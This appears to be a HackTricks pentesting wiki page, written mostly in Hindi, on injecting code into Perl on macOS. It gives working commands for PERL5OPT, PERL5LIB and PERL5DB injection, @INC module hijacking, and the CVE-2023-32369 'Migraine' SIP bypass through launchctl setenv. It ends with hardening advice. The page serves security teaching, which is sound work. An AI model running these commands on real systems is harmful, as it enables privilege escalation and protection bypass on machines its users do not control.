# macOS Perl Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Via `PERL5OPT` & `PERL5LIB` env variable

पर्यावरण चर **`PERL5OPT`** का उपयोग करके यह संभव है कि **Perl** जब इंटरप्रेटर शुरू होता है (यहां तक कि **पहली** पंक्ति को लक्षित स्क्रिप्ट के पार्स होने से पहले) मनमाने आदेशों को निष्पादित करे। उदाहरण के लिए, इस स्क्रिप्ट को बनाएं:
```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
अब **env वेरिएबल को एक्सपोर्ट करें** और **perl** स्क्रिप्ट को निष्पादित करें:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
एक और विकल्प एक Perl मॉड्यूल बनाना है (जैसे कि `/tmp/pmod.pm`):
```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
और फिर env वेरिएबल्स का उपयोग करें ताकि मॉड्यूल स्वचालित रूप से स्थित और लोड हो सके:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod perl victim.pl
```
### अन्य दिलचस्प पर्यावरण चर

* **`PERL5DB`** – जब इंटरप्रेटर **`-d`** (डिबगर) ध्वज के साथ शुरू किया जाता है, तो `PERL5DB` की सामग्री डिबगर संदर्भ के *अंदर* Perl कोड के रूप में निष्पादित होती है। यदि आप एक विशेषाधिकार प्राप्त Perl प्रक्रिया के पर्यावरण **और** कमांड-लाइन ध्वजों को प्रभावित कर सकते हैं, तो आप कुछ इस तरह कर सकते हैं:

```bash
export PERL5DB='system("/bin/zsh")'
sudo perl -d /usr/bin/some_admin_script.pl   # स्क्रिप्ट निष्पादित करने से पहले एक शेल खोलेगा
```

* **`PERL5SHELL`** – Windows पर यह चर नियंत्रित करता है कि Perl किस शेल निष्पादन योग्य का उपयोग करेगा जब उसे एक शेल उत्पन्न करने की आवश्यकता होती है। इसे यहाँ केवल पूर्णता के लिए उल्लेखित किया गया है, क्योंकि यह macOS पर प्रासंगिक नहीं है।

हालांकि `PERL5DB` को `-d` स्विच की आवश्यकता होती है, यह सामान्य है कि ऐसे रखरखाव या इंस्टॉलर स्क्रिप्ट मिलें जो *root* के रूप में इस ध्वज के साथ निष्पादित होती हैं, जिससे यह चर एक मान्य वृद्धि वेक्टर बन जाता है।

## निर्भरताओं के माध्यम से (@INC दुरुपयोग)

यह संभव है कि Perl द्वारा खोजे जाने वाले शामिल पथ को सूचीबद्ध किया जाए (**`@INC`**) चलाकर:
```bash
perl -e 'print join("\n", @INC)'
```
macOS 13/14 पर सामान्य आउटपुट इस प्रकार दिखता है:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
कुछ लौटाए गए फ़ोल्डर वास्तव में मौजूद नहीं हैं, हालाँकि **`/Library/Perl/5.30`** मौजूद है, *SIP* द्वारा *संरक्षित* नहीं है और *SIP-संरक्षित* फ़ोल्डरों से *पहले* है। इसलिए, यदि आप *root* के रूप में लिख सकते हैं, तो आप एक दुर्भावनापूर्ण मॉड्यूल (जैसे `File/Basename.pm`) छोड़ सकते हैं जिसे कोई भी विशेषाधिकार प्राप्त स्क्रिप्ट उस मॉड्यूल को आयात करते समय *प्राथमिकता* से लोड करेगी।

> [!WARNING]
> आपको `/Library/Perl` के अंदर लिखने के लिए अभी भी **root** की आवश्यकता है और macOS एक **TCC** प्रॉम्प्ट दिखाएगा जो लिखने के ऑपरेशन को करने वाली प्रक्रिया के लिए *पूर्ण डिस्क एक्सेस* मांगता है।

उदाहरण के लिए, यदि एक स्क्रिप्ट **`use File::Basename;`** आयात कर रही है, तो यह संभव होगा कि `/Library/Perl/5.30/File/Basename.pm` बनाया जाए जिसमें हमलावर-नियंत्रित कोड हो।

## SIP बायपास माइग्रेशन सहायक के माध्यम से (CVE-2023-32369 “Migraine”)

मई 2023 में Microsoft ने **CVE-2023-32369** का खुलासा किया, जिसे **Migraine** उपनाम दिया गया, एक पोस्ट-एक्सप्लॉइटेशन तकनीक जो *root* हमलावर को पूरी तरह से **सिस्टम इंटीग्रिटी प्रोटेक्शन (SIP)** को **बायपास** करने की अनुमति देती है। कमजोर घटक **`systemmigrationd`** है, जो **`com.apple.rootless.install.heritable`** के साथ एक डेमन है। इस डेमन द्वारा उत्पन्न कोई भी चाइल्ड प्रोसेस इस अधिकार को विरासत में लेता है और इसलिए **SIP** प्रतिबंधों के *बाहर* चलता है।

शोधकर्ताओं द्वारा पहचाने गए बच्चों में Apple-हस्ताक्षरित इंटरप्रेटर है:
```
/usr/bin/perl /usr/libexec/migrateLocalKDC …
```
क्योंकि Perl `PERL5OPT` का सम्मान करता है (और Bash `BASH_ENV` का सम्मान करता है), डेमन के *पर्यावरण* को विषाक्त करना SIP-रहित संदर्भ में मनमाने निष्पादन प्राप्त करने के लिए पर्याप्त है:
```bash
# As root
launchctl setenv PERL5OPT '-Mwarnings;system("/private/tmp/migraine.sh")'

# Trigger a migration (or just wait – systemmigrationd will eventually spawn perl)
open -a "Migration Assistant.app"   # or programmatically invoke /System/Library/PrivateFrameworks/SystemMigration.framework/Resources/MigrationUtility
```
जब `migrateLocalKDC` चलता है, तो `/usr/bin/perl` दुर्भावनापूर्ण `PERL5OPT` के साथ शुरू होता है और `/private/tmp/migraine.sh` को *SIP फिर से सक्षम होने से पहले* निष्पादित करता है। उस स्क्रिप्ट से, आप, उदाहरण के लिए, **`/System/Library/LaunchDaemons`** के अंदर एक पेलोड कॉपी कर सकते हैं या एक फ़ाइल को **अडिलेटेबल** बनाने के लिए `com.apple.rootless` विस्तारित विशेषता असाइन कर सकते हैं।

Apple ने macOS **Ventura 13.4**, **Monterey 12.6.6** और **Big Sur 11.7.7** में इस समस्या को ठीक किया, लेकिन पुराने या बिना पैच किए गए सिस्टम अभी भी शोषण योग्य हैं।

## हार्डनिंग सिफारिशें

1. **खतरनाक वेरिएबल्स को साफ करें** – विशेषाधिकार प्राप्त launchdaemons या cron jobs को एक स्वच्छ वातावरण के साथ शुरू होना चाहिए (`launchctl unsetenv PERL5OPT`, `env -i`, आदि)।
2. **रूट के रूप में इंटरप्रेटर्स चलाने से बचें** जब तक कि यह आवश्यक न हो। संकलित बाइनरी का उपयोग करें या जल्दी विशेषाधिकार छोड़ें।
3. **`-T` (टेंट मोड) के साथ विक्रेता स्क्रिप्ट** ताकि Perl `PERL5OPT` और अन्य असुरक्षित स्विचों को नजरअंदाज करे जब टेंट चेकिंग सक्षम हो।
4. **macOS को अद्यतित रखें** – “Migraine” वर्तमान रिलीज़ में पूरी तरह से पैच किया गया है।

## संदर्भ

- Microsoft Security Blog – “नई macOS भेद्यता, Migraine, सिस्टम इंटीग्रिटी प्रोटेक्शन को बायपास कर सकती है” (CVE-2023-32369), 30 मई 2023।
- Hackyboiz – “macOS SIP बायपास (PERL5OPT & BASH_ENV) अनुसंधान”, मई 2025।

{{#include ../../../banners/hacktricks-training.md}}
